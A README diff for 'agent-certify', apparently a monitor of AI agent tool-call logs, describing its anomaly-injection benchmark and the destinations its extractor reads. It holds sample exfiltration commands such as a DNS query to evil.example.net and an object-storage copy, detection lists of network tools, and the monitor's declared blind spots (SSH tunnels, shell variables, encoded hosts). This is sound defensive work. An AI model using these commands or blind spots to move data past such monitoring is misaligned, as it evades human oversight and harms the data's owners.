@@ -460,27 +460,34 @@ python scripts/benchmark.py --format json        # for CI
 
 ```
 Anomaly injection benchmark — 6 clean session(s) against a baseline of 6
-==========================================================================================================
-anomaly type          expected                         trials  detected     rate  severity
-----------------------------------------------------------------------------------------------------------
-new_tool              new_tool/crit                         6         6   100.0%  6 critical
-error_spike           error_rate/warn                       6         6   100.0%  6 critical
-new_agent             new_link/warn                         6         6   100.0%  6 warning
-volume_spike          call_volume_spike/warn                6         6   100.0%  6 critical
-forbidden_tool        new_tool/crit                         6         6   100.0%  6 critical
-foreign_domain        new_domain/crit                       6         6   100.0%  6 critical
-shell_domain          new_domain/crit                       6         6   100.0%  6 critical
-wrapped_shell_domain  new_domain/crit                       6         6   100.0%  6 critical
-exfiltration          egress_volume_spike/warn              6         6   100.0%  6 critical
-decoy_flood           destination_scan_truncated/crit       6         6   100.0%  6 critical
-padding_evasion       new_domain/crit                       6         6   100.0%  6 critical
-forbidden_region      policy forbidden_region/crit          6         6   100.0%  6 critical
-shell_var_domain      (blind spot)                          6         0     0.0%  not covered by any check
-ssh_tunnel_domain     (blind spot)                          6         0     0.0%  not covered by any check
-file_upload_exfil     (blind spot)                          6         0     0.0%  not covered by any check
-written_url           (must stay silent)                    6         0     0.0%  silent, as it must be (6/6)
-----------------------------------------------------------------------------------------------------------
-detection rate 100.0% (72/72)   false negatives 0.0%   false positives 0.0% (0/6 clean, 0 anomalies)
+================================================================================================================
+anomaly type            expected                         trials  detected     rate  severity
+----------------------------------------------------------------------------------------------------------------
+new_tool                new_tool/crit                         6         6   100.0%  6 critical
+error_spike             error_rate/warn                       6         6   100.0%  6 critical
+new_agent               new_link/warn                         6         6   100.0%  6 warning
+volume_spike            call_volume_spike/warn                6         6   100.0%  6 critical
+forbidden_tool          new_tool/crit                         6         6   100.0%  6 critical
+foreign_domain          new_domain/crit                       6         6   100.0%  6 critical
+shell_domain            new_domain/crit                       6         6   100.0%  6 critical
+wrapped_shell_domain    new_domain/crit                       6         6   100.0%  6 critical
+exfiltration            egress_volume_spike/warn              6         6   100.0%  6 critical
+decoy_flood             destination_scan_truncated/crit       6         6   100.0%  6 critical
+padding_evasion         new_domain/crit                       6         6   100.0%  6 critical
+forbidden_region        policy forbidden_region/crit          6         6   100.0%  6 critical
+forbidden_region_idn    policy forbidden_region/crit          6         6   100.0%  6 critical
+idn_domain              new_domain/crit                       6         6   100.0%  6 critical
+cloud_storage           new_domain/crit                       6         6   100.0%  6 critical
+dns_exfil               new_domain/crit                       6         6   100.0%  6 critical
+numeric_ipv4            new_domain/crit                       6         6   100.0%  6 critical
+assignment_substitution new_domain/crit                       6         6   100.0%  6 critical
+shell_var_domain        (blind spot)                          6         0     0.0%  not covered by any check
+ssh_tunnel_domain       (blind spot)                          6         0     0.0%  not covered by any check
+file_upload_exfil       (blind spot)                          6         0     0.0%  not covered by any check
+written_url             (must stay silent)                    6         0     0.0%  silent, as it must be (6/6)
+----------------------------------------------------------------------------------------------------------------
+detection 100.0% (108/108) among covered types; 85.7% (108/126) of all injected faults, blind spots included
+false negatives 0.0% of covered types   false positives 0.0% (0/6 clean, 0 anomalies)
 false-positive cases: written_url — 6/6 stayed silent, as a clean session must
 blind spots: shell_var_domain, ssh_tunnel_domain, file_upload_exfil — injected and expected to go unreported, no check covers the fault
 ```
@@ -503,8 +510,23 @@ blind spots: shell_var_domain, ssh_tunnel_domain, file_upload_exfil — injected
 | `inject_file_upload_exfil` | a file uploaded to a known host, whose size the log does not hold | **nothing** — a measured blind spot |
 | `inject_written_url` | a URL written into a file's contents, never called | **nothing** — a measured false-positive case |
 | `inject_forbidden_region` | a destination in a country the operator's policy forbids | `forbidden_region` **policy violation**, critical |
+| `inject_forbidden_region_idn` | the same, under an internationalised ccTLD (`…xn--p1ai`) | `forbidden_region` **policy violation**, critical |
+| `inject_idn_domain` | a destination written as an internationalised name (`collector.рф`) | `new_domain`, critical |
+| `inject_cloud_storage` | a file copied to object storage (`aws s3 cp f s3://bucket/k`) | `new_domain`, critical |
+| `inject_dns_exfil` | a name queried with `dig`: the question is the payload | `new_domain`, critical |
+| `inject_numeric_ipv4` | an address written as one integer (`http://2130706433/`) | `new_domain`, critical |
+| `inject_assignment_substitution` | a host reached by a command inside an assignment (`X=$(curl host)`) | `new_domain`, critical |
 
-Seven things in that table are worth more than the 100%:
+**Two rates, never one.** 100% of the faults a check is meant to catch is the
+answer to a narrow question; 86% of everything injected is the answer to the
+one a reader is actually asking, and it is lower because three declared blind
+spots sit in the same table. Both figures appear together, in the table, in
+`--format json` (`detection_rate` and `overall_detection_rate`) and here — a
+covered-only rate on its own reads as "nothing gets past this" while a fault
+nobody catches is counted out of the denominator, and a test fails if that line
+ever carries one figure alone.
+
+Eight things in that table are worth more than the 100%:
 
 - **The volume spike was a measured miss for a release.** v0.6.1 reported it as
   a blind spot — no check read call volume — and v0.7.0's `call_volume_spike`
@@ -556,13 +578,17 @@ Seven things in that table are worth more than the 100%:
   All three are counted apart from the detection rate, and the day anything
   does read one, its row reports by itself. "No blind spots left" is a sentence
   this project will not print unless the measurement says it.
-- **One row is a policy violation, not an anomaly.** A destination in a
+- **Two rows are policy violations, not anomalies.** A destination in a
   forbidden country is not unusual, it is *not allowed*: no amount of history
   makes it normal, and no baseline would ever report it.
   `inject_forbidden_region` is scored against the policy engine — which is why
   the runner checks policies as well as anomalies, and why the row reads
   `policy forbidden_region/crit`. The country is read from the host's ccTLD, so
   the measurement needs no database and no name resolution.
+  `inject_forbidden_region_idn` is the same fault under an internationalised
+  ccTLD, and it measures the half of a region policy that used to fail
+  quietly: the destination was recorded and reported as new while the rule
+  written to stop it said nothing, because the region came back `unknown`.
 - **One row is a clean session, not a fault.** `inject_written_url` writes a
   URL into a file's contents and measures that **nothing** is reported about
   it. A blind spot and a false-positive case both expect silence, for opposite
@@ -570,6 +596,19 @@ Seven things in that table are worth more than the 100%:
   right — so the table scores them apart, and a report on this row is named a
   false positive rather than a surprise detection. It earns its place by having
   failed: of the 43 hosts this release stopped reading on real logs, 19 were URLs a session had only ever *written* into a file.
+- **Five rows are false negatives that shipped.** A static audit of v0.8.0
+  found five ways to reach a destination that the extractor read as nothing at
+  all: an internationalised name (`https://collector.xn--p1ai/x`), object
+  storage (`aws s3 cp f s3://bucket/k`, `gsutil`, `rclone`), a DNS query
+  (`dig secret.evil.example.net`), an address written as an integer
+  (`http://2130706433/`) and a command substituted into an assignment
+  (`X=$(curl host/x)`). None of them tripped a bound, so none of them produced
+  a truncation either: the report was **silent**, and a silent report reads as
+  "nothing happened". Neither this README nor `SECURITY.md` had declared any of
+  them — which is the part worth stopping for, because an undeclared gap is a
+  claim that happens to be false. Each now has an injection that builds a real
+  argument object and hands it to the production extractor, so the next one has
+  to get past a measurement rather than past a reviewer.
 - **The baseline is learned from sessions that are not the ones tested.**
   `learn_holdout()` holds out every other session; a baseline learned from
   exactly the sessions it is then run against reports nothing on them by
@@ -607,12 +646,42 @@ agent-certify baseline show                               # includes a domains s
 extraction is broad but not indiscriminate:
 
 - **any full URL** in a tool call's arguments — `https://api.openai.com/v1/chat`
-  gives `api.openai.com` (`http`, `https`, `ws`, `wss`, `ftp`, `ftps`);
+  gives `api.openai.com`. Not only the web: `s3`, `gs`, `azure`, `abfs(s)`,
+  `wasb(s)`, `smb`, `ssh`, `sftp`, `scp`, `rsync`, `tftp`, `redis(s)`,
+  `postgres(ql)`, `mysql`, `mongodb`, `mongodb+srv`, `amqp(s)`, `mqtt` and
+  `ldap(s)` as well as `http(s)`, `ws(s)` and `ftp(s)` — `URL_SCHEMES` in
+  `agent_certify/domains.py` is the list. A table streamed to
+  `postgres://db.example.net/x` leaves as surely as one posted to an API, and
+  reading only `http` meant it left unrecorded;
 - **a bare host**, but only as the value of a field that names one: `url`,
   `uri`, `endpoint`, `host`, `hostname`, `domain`, `base_url`, `base_uri`,
   `api_url`, `webhook_url`, `server`, `origin`, `proxy`, their plurals, and a
   dozen more — `NETWORK_KEYS` in `agent_certify/domains.py` is the full list.
   `{"host": "db.internal"}` counts; an IP literal counts too.
+
+- **a bucket or a configured remote**, which is a destination *without a host
+  name*: `s3://logs-eu/key` names a bucket at whichever endpoint the client was
+  configured for, and `rclone copy f backup:dir` names a remote whose address
+  lives in rclone's own configuration file. Those are recorded as
+  **`s3:logs-eu`**, **`gs:logs-eu`** and **`rclone:backup`** — a form no host
+  name can take, so nothing downstream mistakes it for something resolvable.
+  They go through the same baseline and the same patterns as a host
+  (`s3:logs-eu` matches itself, `s3:*` matches every bucket; there is no `*.`
+  wildcard, because a bucket name has no subdomains), and their **region is
+  always `unknown`**: a bucket name says nothing about where the bucket is.
+
+- **an address in any of its spellings.** `2130706433`, `0x7f000001`,
+  `0177.0.0.1` and `127.1` are all 127.0.0.1 to every socket library there is,
+  so all four are normalised to the dotted quad and recorded as **one**
+  destination. A number with fewer than four parts whose first octet would be
+  zero is not an address — `nc host 9000` names a port, not 0.0.35.40.
+
+- **an internationalised name**, in either spelling. `collector.рф` is
+  converted to its ASCII form, `collector.xn--p1ai`, and that is what is
+  recorded and compared, so one pattern (`*.xn--p1ai`, or `*.рф`, which
+  normalises to the same thing) covers both. The conversion is the standard
+  library's and it never raises: a name it cannot convert stays as it is and
+  fails the shape test like any other non-host.
 
   One exception, to keep configuration noise out of the report: a value whose
   last label is a common file extension (`notes.txt`, `data.csv`, `app.log` —
@@ -629,18 +698,41 @@ extraction is broad but not indiscriminate:
   → collector.example.net        [CRITICAL] new_domain
   ```
 
-  Recognised: `curl`, `wget`, `http`/`https` (httpie), `nc`, `ncat`, `netcat`,
-  `socat`, `telnet`, `ssh`, `scp`, `sftp`, `rsync`, `ftp`, `git` (only
-  `clone`, `fetch`, `pull`, `push`, `ls-remote`, `archive` and `remote add`),
-  and `Invoke-WebRequest`, `Invoke-RestMethod`, `iwr`, `irm`,
-  `Test-NetConnection`. The name is compared without its directory or
-  extension, so `/usr/bin/curl` and `curl.exe` both count.
+  Recognised, in five families (`NETWORK_COMMANDS`):
+
+  | family | programs | where the destination is |
+  |---|---|---|
+  | web and shells | `curl`, `wget`, `http`/`https` (httpie), `nc`, `ncat`, `netcat`, `socat`, `telnet`, `ssh`, `scp`, `sftp`, `rsync`, `ftp`, `tftp`, `smbclient`, `git` (only `clone`, `fetch`, `pull`, `push`, `ls-remote`, `archive` and `remote add`) | a positional argument, or `-x`/`--proxy`, `--resolve`, `--connect-to`, `ssh -J`, `smbclient -L`, `//server/share` |
+  | PowerShell | `Invoke-WebRequest`, `Invoke-RestMethod`, `iwr`, `irm`, `Test-NetConnection` | `-Uri`, `-ComputerName`, or a positional argument |
+  | object storage and cloud | `aws`, `gcloud`, `gsutil`, `az`, `azcopy`, `rclone`, `mc`, `s3cmd`, `kubectl` | `--endpoint-url`, `--endpoint`, `--server`, `--host`, `--host-base`, `kubectl -s`, a bucket URL, or `remote:path` for `rclone` |
+  | resolvers | `dig`, `nslookup`, `host`, `drill` | **the name being queried**, and `@server` for `dig`/`drill` |
+  | databases and TLS | `psql`, `mysql`, `mysqldump`, `redis-cli`, `mongosh`, `mongo`, `mongodump`, `openssl` | `-h`/`--host`, a connection URL, `openssl s_client -connect` |
+
+  The name is compared without its directory or extension, so `/usr/bin/curl`
+  and `curl.exe` both count.
+
+  **A queried name is a destination.** `dig secret-data.evil.example.net
+  +short` sends nothing and reaches nobody, in the sense a packet capture would
+  show — and tells whoever runs that zone the secret in the name. DNS
+  exfiltration needs no connection, and a reader that only looks for
+  connections sees none.
+
+  For the cloud, resolver and database clients the *shape* of the argument is
+  not enough — a bucket name, a resource name and a database name all look
+  alike — so those are read by name and option: `aws --version`,
+  `kubectl get pods`, `psql -f migration.sql`, `rclone listremotes` and
+  `dig` with no argument name no destination and produce none.
 
   The line is split on `|`, `||`, `&&`, `;` and `&` **outside quotes** —
   `git commit -m "fix; curl api.example.net"` runs one command and reaches
   nobody — each segment is tokenised, and `sudo`, `env VAR=x`, `time`,
   `nohup`, `command`, `exec` and leading `VAR=value` assignments are skipped to
-  find the program underneath. A line break always separates, and quoting is
+  find the program underneath. A **command substitution** — `$(…)` or
+  backticks — is read as a command line of its own and then taken out of the
+  line that held it, which is what makes both
+  `X=$(curl host.example.net/x)` (where the substitution is all there is) and
+  `TOKEN=$(cat /tmp/t) curl api.example.net/v1` (where it is in the way) read
+  correctly. A line break always separates, and quoting is
   judged one line at a time, so a stray quote cannot change how the lines
   around it are read; a line whose quoting does not balance falls back to
   splitting on every separator, which is the conservative reading — a malformed
@@ -680,6 +772,15 @@ of a document full of links records nothing.
 
 Measured over eleven held-out real sessions (baselines of two to four sessions, so a worst case), before and after, back to back on the same files: **109 anomalies before, 72 after; 94 critical before, 58 after**. Of the 104 hosts read before, 43 stopped being read, and **not one of them had been contacted** — traced key by key: 16 were not shaped like a host, 19 appeared only in a file-writing argument, 8 were a fragment of a quoted argument. Every genuine destination survived, the outbound-volume spike included. The benchmark's `written_url` case keeps the content rule honest.
 
+The schemes, clients, buckets, addresses and substitutions above were added the
+same way: measured on held-out real sessions before and after, per check and per
+severity. **Not one new anomaly** on sessions that were not themselves about
+testing this feature, and every alert that was there before was still there —
+two hosts excepted, both of them words glued to a scheme (`xhttps://…`) that
+the scheme guard now refuses. What the new readers found on real logs is
+nothing, which is the correct answer for logs that predate them; what they find
+on the benchmark is five faults out of five.
+
 A command **inside** a command is read one level deep, so a wrapped client is
 read like a bare one: the value of `bash -c`, `sh -c`, `zsh -c`, `dash -c`,
 `pwsh -Command`, `powershell -Command` and `cmd /c` (`bash -lc "curl …"`
@@ -687,7 +788,13 @@ included), and the remote command of `ssh host '<command>'` — which records
 both the host connected to and the host that command then reached. The inner
 program is judged by the same rule as the outer one, so
 `bash -c "echo example.com"` still gives nothing. One level: a client wrapped
-inside a wrapped command is not read (`MAX_SHELL_DEPTH`).
+inside a wrapped command is not read (`MAX_SHELL_DEPTH`). When that limit stops
+a nesting whose text holds a URL or the name of a known client, the call is
+counted as a **truncated scan** and reported — a bound reached is never
+silence. A nesting holding neither, like the everyday
+`ssh host 'JOB=$(sbatch …)'`, is not reported: it was read far enough to know
+there is nothing in it, and a flag that fires on ordinary lines stops being
+read.
 
 **Where this stops.** Three boundaries, kept on purpose:
 
@@ -697,9 +804,10 @@ inside a wrapped command is not read (`MAX_SHELL_DEPTH`).
 - a host at the far end of a forwarding — `ssh -L 8080:hidden.example.net:80
   ops@jump` records `jump`, the host it connected to, and not the tunnelled
   one;
-- a host that is encoded or built by substitution (base64, `$(…)`,
-  concatenation), and the value of an option that takes one but is not on the
-  list of options that name a destination.
+- a host that is **encoded** (base64, hex-in-a-string, concatenation at
+  runtime), and the value of an option that takes one but is not on the list of
+  options that name a destination. A host inside a `$(…)` is read, one level
+  deep, as of v0.8.0.
 
 The first two are the injection benchmark's measured blind spots
 (`shell_var_domain`, `ssh_tunnel_domain`), not silent gaps; the third is
@@ -715,6 +823,7 @@ answer always says how it was reached:
 | source | from | needs |
 |---|---|---|
 | `cctld` | the host's country-code domain (`api.example.cn` → `CN`, `bbc.co.uk` → `GB`) | nothing |
+| `cctld_idn` | an **internationalised** country-code domain (`collector.xn--p1ai` → `RU`, `shop.xn--fiqs8s` → `CN`) | nothing |
 | `geoip` | an address literal, in a local database (`77.88.8.8` → `RU`) | `--geoip-db` |
 | `dns+geoip` | a name resolved to an address, then looked up | `--resolve-dns` **and** `--geoip-db` |
 | `unknown` | nothing above applied | — |
@@ -723,6 +832,19 @@ answer always says how it was reached:
 [CRITICAL] FORBIDDEN region RU: collector.example.ru (RU (ccTLD))
            collector.example.ru is in RU (ccTLD), reached by tool:WebFetch
 ```
+
+**An internationalised ccTLD is a ccTLD**, and reported as `ccTLD (IDN)`.
+`collector.рф` is recorded as `collector.xn--p1ai` and placed in `RU`, so a
+`forbidden_region RU` rule reaches it — it did not before v0.8.0, because the
+two-letter table cannot answer for a label that is not two letters, and the
+destination came back with no region at all while the rule written to stop it
+said nothing. The table covers all 61 delegated IDN ccTLDs, including both
+Chinese forms (`xn--fiqs8s`, `xn--fiqz9s`), India's fourteen scripts and
+Taiwan's two; it is transcribed from the [IANA Root Zone
+Database](https://www.iana.org/domains/root/db) (type `country-code`, field
+`iso3166_code`, read from its machine-readable
+[`tlds.json`](https://data.iana.org/TLD/v1/tlds.json)) and pinned by a test to
+the day it was last checked, so it cannot drift from its source in silence.
 
 **A `.com` hosted in Shanghai is `unknown`.** There is nothing in the name to
 read, and nothing is resolved unless you ask. That is the honest limit of this
